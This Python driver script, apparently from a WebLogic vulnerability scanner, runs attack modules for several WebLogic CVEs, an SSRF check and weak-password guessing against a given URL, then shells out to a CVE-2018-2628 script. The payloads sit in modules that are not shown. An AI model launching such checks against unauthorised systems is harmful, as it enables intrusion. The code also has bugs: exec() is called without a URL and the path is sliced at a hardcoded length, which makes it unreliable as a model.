# -*- coding: utf-8 -*-
import os
import re
import weblogic.CVE_2019_2725
import weblogic.CVE_2017_10271
import weblogic.ssrf
import weblogic.weblogic_weakpasswd
import weblogic.CNVD_C_2019_48814
import weblogic.CVE_2017_3506
import weblogic.Common_page


def exec(URL):
    weblogic.Common_page.attack(URL)
    weblogic.CNVD_C_2019_48814.attack(URL)
    weblogic.CVE_2017_10271.attack(URL)
    weblogic.ssrf.attack(URL)
    weblogic.weblogic_weakpasswd.attack(URL)
    weblogic.CVE_2019_2725.attack(URL+'/')
    weblogic.CVE_2017_3506.attack(URL)

    print('[+]开始检测-Weblogic-CVE-2018-2628。[+]')
    # 切换工作路径
    os.chdir(os.path.realpath(__file__)[:38])
    url = re.findall('//(.*?):', URL, flags=0)[0]
    ip = re.findall(r':(.*?)\Z', URL[6:], flags=0)[0]
    os.system(f"py -2 CVE_2018_2628.py {url} {ip}")
    print('[+]检测结束-Weblogic-CVE-2018-2628。[+]')


if __name__ == "__main__":
    exec()
